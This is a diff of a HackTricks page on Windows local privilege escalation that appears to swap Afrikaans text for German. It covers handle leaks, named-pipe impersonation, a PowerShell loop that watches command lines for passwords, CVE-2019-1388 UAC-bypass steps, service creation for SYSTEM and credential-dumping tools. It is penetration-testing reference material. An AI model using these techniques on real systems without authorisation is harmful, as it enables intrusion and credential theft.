+Stellen Sie sich vor, dass **ein Prozess, der als SYSTEM ausgeführt wird, einen neuen Prozess** (`OpenProcess()`) mit **voller Zugriffsberechtigung** öffnet. Der gleiche Prozess **erstellt auch einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
+Wenn Sie dann **vollen Zugriff auf den niedrig privilegierten Prozess** haben, können Sie das **offene Handle zum privilegierten Prozess, das mit `OpenProcess()` erstellt wurde**, ergreifen und **Shellcode injizieren**.\
+[Lesen Sie dieses Beispiel für weitere Informationen darüber, **wie man diese Schwachstelle erkennt und ausnutzt**.](leaked-handle-exploitation.md)\
+[Lesen Sie diesen **anderen Beitrag für eine umfassendere Erklärung, wie man mehr offene Handles von Prozessen und Threads mit unterschiedlichen Berechtigungsstufen (nicht nur voller Zugriff) testet und missbraucht**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
 
-## Genoemde Pyp Klient Imitasie
+## Named Pipe Client Impersonation
 
-Gedeelde geheue segmente, bekend as **pype**, stel proseskommunikasie en datatransfer in staat.
+Gemeinsame Speichersegmente, die als **Pipes** bezeichnet werden, ermöglichen die Kommunikation zwischen Prozessen und den Datenaustausch.
 
-Windows bied 'n funksie genaamd **Genoemde Pype**, wat onverwante prosesse toelaat om data te deel, selfs oor verskillende netwerke. Dit herinner aan 'n kliënt/bediener argitektuur, met rolle wat gedefinieer is as **genoemde pyp bediener** en **genoemde pyp klient**.
+Windows bietet eine Funktion namens **Named Pipes**, die es nicht verwandten Prozessen ermöglicht, Daten zu teilen, selbst über verschiedene Netzwerke hinweg. Dies ähnelt einer Client/Server-Architektur, bei der die Rollen als **Named Pipe Server** und **Named Pipe Client** definiert sind.
 
-Wanneer data deur 'n pyp deur 'n **klient** gestuur word, het die **bediener** wat die pyp opgestel het die vermoë om **die identiteit** van die **klient** aan te neem, mits dit die nodige **SeImpersonate** regte het. Om 'n **voorregte proses** te identifiseer wat via 'n pyp kommunikeer wat jy kan naboots, bied 'n geleentheid om **hoër voorregte te verkry** deur die identiteit van daardie proses aan te neem sodra dit met die pyp waarmee jy werk, interaksie het. Vir instruksies oor hoe om so 'n aanval uit te voer, kan nuttige gidse gevind word [**hier**](named-pipe-client-impersonation.md) en [**hier**](./#from-high-integrity-to-system).
+Wenn Daten durch eine Pipe von einem **Client** gesendet werden, hat der **Server**, der die Pipe eingerichtet hat, die Möglichkeit, die **Identität** des **Clients** zu **übernehmen**, vorausgesetzt, er hat die erforderlichen **SeImpersonate**-Rechte. Die Identifizierung eines **privilegierten Prozesses**, der über eine Pipe kommuniziert und den Sie nachahmen können, bietet die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem Sie die Identität dieses Prozesses übernehmen, sobald er mit der von Ihnen eingerichteten Pipe interagiert. Für Anweisungen zur Durchführung eines solchen Angriffs sind hilfreiche Anleitungen [**hier**](named-pipe-client-impersonation.md) und [**hier**](./#from-high-integrity-to-system) zu finden.
 
-Ook die volgende hulpmiddel laat jou toe om **'n genoem pyp kommunikasie met 'n hulpmiddel soos burp te onderskep:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie hulpmiddel laat jou toe om al die pype te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+Außerdem ermöglicht das folgende Tool, **eine Named Pipe-Kommunikation mit einem Tool wie Burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool ermöglicht es, alle Pipes aufzulisten und zu sehen, um Privescs zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
-## Verskeie
+## Misc
 
-### **Monitering van Opdraglyne vir wagwoorde**
+### **Überwachung von Befehlszeilen auf Passwörter**
 
-Wanneer jy 'n shell as 'n gebruiker kry, mag daar geskeduleerde take of ander prosesse wees wat **akkrediteer op die opdraglyn**. Die onderstaande skrip vang proses opdraglyne elke twee sekondes en vergelyk die huidige toestand met die vorige toestand, wat enige verskille uitset.
+Wenn Sie eine Shell als Benutzer erhalten, können geplante Aufgaben oder andere Prozesse ausgeführt werden, die **Anmeldeinformationen über die Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen der Prozesse und vergleicht den aktuellen Zustand mit dem vorherigen Zustand, wobei alle Unterschiede ausgegeben werden.
 ```powershell
 while($true)
 {
@@ -1263,15 +1263,15 @@ $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
 Compare-Object -ReferenceObject $process -DifferenceObject $process2
 }
 ```
-## Watter wagwoorde uit prosesse steel
+## Passwörter aus Prozessen stehlen
 
-## Van Lae Priv Gebruiker na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass
+## Von Low Priv User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass
 
-As jy toegang het tot die grafiese koppelvlak (deur die konsole of RDP) en UAC is geaktiveer, is dit in sommige weergawes van Microsoft Windows moontlik om 'n terminal of enige ander proses soos "NT\AUTHORITY SYSTEM" van 'n nie-bevoegde gebruiker te laat loop.
+Wenn Sie Zugriff auf die grafische Benutzeroberfläche (über Konsole oder RDP) haben und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder einen anderen Prozess wie "NT\AUTHORITY SYSTEM" von einem unprivilegierten Benutzer auszuführen.
 
-Dit maak dit moontlik om bevoegdhede te verhoog en UAC terselfdertyd met dieselfde kwesbaarheid te omseil. Boonop is daar geen behoefte om enigiets te installeer nie en die binêre wat tydens die proses gebruik word, is onderteken en uitgegee deur Microsoft.
+Dies ermöglicht es, die Berechtigungen zu eskalieren und UAC gleichzeitig mit derselben Schwachstelle zu umgehen. Darüber hinaus ist es nicht erforderlich, etwas zu installieren, und die während des Prozesses verwendete Binärdatei ist signiert und von Microsoft herausgegeben.
 
-Sommige van die geraakte stelsels is die volgende:
+Einige der betroffenen Systeme sind die folgenden:
 ```
 SERVER
 ======
@@ -1293,7 +1293,7 @@ Windows 10 1607	14393	** link OPENED AS SYSTEM **
 Windows 10 1703	15063	link NOT opened
 Windows 10 1709	16299	link NOT opened
 ```
-Om hierdie kwesbaarheid te benut, is dit nodig om die volgende stappe uit te voer:
+Um diese Schwachstelle auszunutzen, sind die folgenden Schritte erforderlich:
 ```
 1) Right click on the HHUPD.EXE file and run it as Administrator.
 
@@ -1311,116 +1311,116 @@ Om hierdie kwesbaarheid te benut, is dit nodig om die volgende stappe uit te voe
 
 8) Remember to cancel setup and the UAC prompt to return to your desktop.
 ```
-You het al die nodige lêers en inligting in die volgende GitHub-repos:
+Du hast alle notwendigen Dateien und Informationen im folgenden GitHub-Repository:
 
 https://github.com/jas502n/CVE-2019-1388
 
-## Van Administrateur Medium na Hoë Integriteitsvlak / UAC Bypass
+## Vom Administrator-Medium zum hohen Integritätslevel / UAC-Umgehung
 
-Lees dit om **meer te leer oor Integriteitsvlakke**:
+Lies dies, um **über Integritätslevel zu lernen**:
 
 {% content-ref url="integrity-levels.md" %}
 [integrity-levels.md](integrity-levels.md)
 {% endcontent-ref %}
 
-Lees dan **hierdie om meer te leer oor UAC en UAC-bypasses:**
+Lies dann **dies, um über UAC und UAC-Umgehungen zu lernen:**
 
 {% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
 [uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
 {% endcontent-ref %}
 
-## **Van Hoë Integriteit na Stelsel**
+## **Von hohem Integritätslevel zu System**
 
-### **Nuwe diens**
+### **Neuer Dienst**
 
-As jy reeds op 'n Hoë Integriteit-proses loop, kan die **oorgang na SYSTEM** maklik wees deur eenvoudig **'n nuwe diens te skep en uit te voer**:
+Wenn du bereits in einem Prozess mit hohem Integritätslevel arbeitest, kann der **Übergang zu SYSTEM** einfach sein, indem du **einen neuen Dienst erstellst und ausführst**:
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
 ### AlwaysInstallElevated
 
-Van 'n Hoë Integriteit proses kan jy probeer om die **AlwaysInstallElevated registrasie-invoere** te **aktiveer** en 'n omgekeerde skulp te **installeer** met 'n _**.msi**_ omhulsel.\
-[Meer inligting oor die betrokke registrasiesleutels en hoe om 'n _.msi_ pakket te installeer hier.](./#alwaysinstallelevated)
+Von einem High Integrity-Prozess aus könnten Sie versuchen, die **AlwaysInstallElevated-Registrierungseinträge zu aktivieren** und eine **Reverse Shell** mit einem _**.msi**_-Wrapper zu **installieren**.\
+[Weitere Informationen zu den beteiligten Registrierungsschlüsseln und wie man ein _.msi_-Paket installiert, finden Sie hier.](./#alwaysinstallelevated)
 
-### High + SeImpersonate privilege to System
+### High + SeImpersonate-Berechtigung zu System
 
-**Jy kan** [**die kode hier vind**](seimpersonate-from-high-to-system.md)**.**
+**Sie können** [**den Code hier finden**](seimpersonate-from-high-to-system.md)**.**
 
-### From SeDebug + SeImpersonate to Full Token privileges
+### Von SeDebug + SeImpersonate zu vollständigen Token-Berechtigungen
 
-As jy daardie token voorregte het (waarskynlik sal jy dit in 'n reeds Hoë Integriteit proses vind), sal jy in staat wees om **byna enige proses** (nie beskermde prosesse nie) met die SeDebug voorreg te **oopmaak**, **die token** van die proses te **kopieer**, en 'n **arbitraire proses met daardie token te skep**.\
-Die gebruik van hierdie tegniek behels gewoonlik **om enige proses wat as SYSTEM loop met al die token voorregte te kies** (_ja, jy kan SYSTEM prosesse vind sonder al die token voorregte_).\
-**Jy kan 'n** [**voorbeeld van kode wat die voorgestelde tegniek uitvoer hier vind**](sedebug-+-seimpersonate-copy-token.md)**.**
+Wenn Sie diese Token-Berechtigungen haben (wahrscheinlich finden Sie dies in einem bereits High Integrity-Prozess), können Sie **fast jeden Prozess** (nicht geschützte Prozesse) mit der SeDebug-Berechtigung **öffnen**, das **Token** des Prozesses **kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
+Mit dieser Technik wird normalerweise **ein beliebiger Prozess, der als SYSTEM ausgeführt wird, mit allen Token-Berechtigungen ausgewählt** (_ja, Sie können SYSTEM-Prozesse ohne alle Token-Berechtigungen finden_).\
+**Sie können ein** [**Beispiel für den Code, der die vorgeschlagene Technik ausführt, hier finden**](sedebug-+-seimpersonate-copy-token.md)**.**
 
 ### **Named Pipes**
 
-Hierdie tegniek word deur meterpreter gebruik om op te skaal in `getsystem`. Die tegniek bestaan uit **die skep van 'n pyp en dan 'n diens te skep/te misbruik om op daardie pyp te skryf**. Dan sal die **bediener** wat die pyp geskep het met die **`SeImpersonate`** voorreg in staat wees om die **token** van die pyp kliënt (die diens) te **verteenwoordig** en SYSTEM voorregte te verkry.\
-As jy wil [**meer leer oor naam pype moet jy dit lees**](./#named-pipe-client-impersonation).\
-As jy 'n voorbeeld wil lees van [**hoe om van hoë integriteit na System te gaan met naam pype moet jy dit lees**](from-high-integrity-to-system-with-name-pipes.md).
+Diese Technik wird von Meterpreter verwendet, um in `getsystem` zu eskalieren. Die Technik besteht darin, **ein Pipe zu erstellen und dann einen Dienst zu erstellen/auszunutzen, um in dieses Pipe zu schreiben**. Dann kann der **Server**, der das Pipe mit der **`SeImpersonate`**-Berechtigung erstellt hat, das **Token** des Pipe-Clients (des Dienstes) **nachahmen** und SYSTEM-Berechtigungen erhalten.\
+Wenn Sie [**mehr über Namens-Pipes erfahren möchten, sollten Sie dies lesen**](./#named-pipe-client-impersonation).\
+Wenn Sie ein Beispiel lesen möchten, [**wie man von hoher Integrität zu System mit Namens-Pipes gelangt, sollten Sie dies lesen**](from-high-integrity-to-system-with-name-pipes.md).
 
 ### Dll Hijacking
 
-As jy daarin slaag om 'n **dll** te **hijack** wat deur 'n **proses** wat as **SYSTEM** loop, sal jy in staat wees om arbitrêre kode met daardie toestemmings uit te voer. Daarom is Dll Hijacking ook nuttig vir hierdie soort voorregte opheffing, en, verder, as dit **veel makliker is om te bereik vanuit 'n hoë integriteit proses** aangesien dit **skryftoestemmings** op die vouers het wat gebruik word om dlls te laai.\
-**Jy kan** [**meer leer oor Dll hijacking hier**](dll-hijacking/)**.**
+Wenn Sie es schaffen, eine **dll** zu **hijacken**, die von einem **Prozess** ausgeführt wird, der als **SYSTEM** läuft, können Sie beliebigen Code mit diesen Berechtigungen ausführen. Daher ist Dll Hijacking auch nützlich für diese Art der Privilegieneskalation und zudem **viel einfacher von einem High Integrity-Prozess aus zu erreichen**, da er **Schreibberechtigungen** für die Ordner hat, die zum Laden von DLLs verwendet werden.\
+**Sie können** [**hier mehr über Dll Hijacking erfahren**](dll-hijacking/)**.**
 
-### **From Administrator or Network Service to System**
+### **Von Administrator oder Netzwerkdienst zu System**
 
 {% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}
 
-### From LOCAL SERVICE or NETWORK SERVICE to full privs
+### Von LOCAL SERVICE oder NETWORK SERVICE zu vollständigen Berechtigungen
 
-**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
+**Lesen:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
 
-## More help
+## Weitere Hilfe
 
-[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)
+[Statische Impacket-Binärdateien](https://github.com/ropnop/impacket_static_binaries)
 
-## Useful tools
+## Nützliche Tools
 
-**Beste hulpmiddel om te soek na Windows plaaslike voorregte opheffing vektore:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+**Bestes Tool zur Suche nach Windows-Privilegieneskalationsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 **PS**
 
 [**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
-[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kontroleer vir miskonfigurasies en sensitiewe lêers (**[**kontroleer hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Gekontrakteer.**\
-[**JAWS**](https://github.com/411Hall/JAWS) **-- Kontroleer vir sommige moontlike miskonfigurasies en versamel inligting (**[**kontroleer hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
-[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kontroleer vir miskonfigurasies**\
-[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Dit onttrek PuTTY, WinSCP, SuperPuTTY, FileZilla, en RDP gestoor sessie inligting. Gebruik -Thorough in plaaslik.**\
-[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Onttrek akrediteer uit Credential Manager. Gekontrakteer.**\
-[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spuit versamelde wagwoorde oor domein**\
-[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer en man-in-the-middle hulpmiddel.**\
-[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows enumerasie**\
-[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Soek na bekende privesc kwesbaarhede (DEPRECATED vir Watson)\
-[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Plaaslike kontroles **(Benodig Admin regte)**
+[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Überprüfen Sie auf Fehlkonfigurationen und sensible Dateien (**[**hier überprüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Erkannt.**\
+[**JAWS**](https://github.com/411Hall/JAWS) **-- Überprüfen Sie auf einige mögliche Fehlkonfigurationen und sammeln Sie Informationen (**[**hier überprüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
+[**privesc** ](https://github.com/enjoiz/Privesc)**-- Überprüfen Sie auf Fehlkonfigurationen**\
+[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Es extrahiert gespeicherte Sitzungsinformationen von PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Verwenden Sie -Thorough lokal.**\
+[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldeinformationen aus dem Anmeldeinformations-Manager. Erkannt.**\
+[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprühen Sie gesammelte Passwörter über die Domain**\
+[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell ADIDNS/LLMNR/mDNS/NBNS-Spoofer und Man-in-the-Middle-Tool.**\
+[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Grundlegende Privilegieneskalation Windows-Enumeration**\
+[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Suchen Sie nach bekannten Privilegieneskalationsanfälligkeiten (DEPRECATED für Watson)\
+[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Überprüfungen **(Benötigt Administratorrechte)**
 
 **Exe**
 
-[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek na bekende privesc kwesbaarhede (moet saamgestel word met VisualStudio) ([**vooraf saamgestel**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
-[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates die gasheer op soek na miskonfigurasies (meer 'n inligting versamel hulpmiddel as privesc) (moet saamgestel word) **(**[**vooraf saamgestel**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
-[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Onttrek akrediteer uit baie sagteware (vooraf saamgestelde exe in github)**\
-[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port van PowerUp na C#**\
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Kontroleer vir miskonfigurasie (uitvoerbare vooraf saamgestelde in github). Nie aanbeveel nie. Dit werk nie goed in Win10.\
-[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kontroleer vir moontlike miskonfigurasies (exe van python). Nie aanbeveel nie. Dit werk nie goed in Win10.
+[**Watson**](https://github.com/rasta-mouse/Watson) -- Suchen Sie nach bekannten Privilegieneskalationsanfälligkeiten (muss mit VisualStudio kompiliert werden) ([**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
+[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (eher ein Informationssammlungswerkzeug als Privilegieneskalation) (muss kompiliert werden) **(**[**vorkompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
+[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldeinformationen aus vielen Softwareanwendungen (vorkompilierte exe in github)**\
+[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port von PowerUp nach C#**\
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Überprüfen Sie auf Fehlkonfigurationen (ausführbare vorkompilierte Datei in github). Nicht empfohlen. Funktioniert nicht gut in Win10.\
+[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Überprüfen Sie auf mögliche Fehlkonfigurationen (exe aus python). Nicht empfohlen. Funktioniert nicht gut in Win10.
 
 **Bat**
 
-[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Hulpmiddel geskep gebaseer op hierdie pos (dit het nie accesschk nodig om behoorlik te werk nie, maar dit kan dit gebruik).
+[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf diesem Beitrag basiert (es benötigt keinen accesschk, um ordnungsgemäß zu funktionieren, kann ihn aber verwenden).
 
 **Local**
 
-[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die uitvoer van **systeminfo** en beveel werkende exploits aan (lokale python)\
-[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die uitvoer van **systeminfo** en beveel werkende exploits aan (lokale python)
+[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
+[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)
 
 **Meterpreter**
 
 _multi/recon/local\_exploit\_suggestor_
 
-Jy moet die projek saamstel met die korrekte weergawe van .NET ([sien dit](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die slagoffer gasheer te sien kan jy doen:
+Sie müssen das Projekt mit der richtigen Version von .NET kompilieren ([siehe dies](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die installierte Version von .NET auf dem Zielhost zu sehen, können Sie Folgendes tun:
 ```
 C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
 ```
-## Bibliografie
+## Bibliographie
 
 * [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
 * [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
@@ -1438,16 +1438,16 @@ C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the 
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
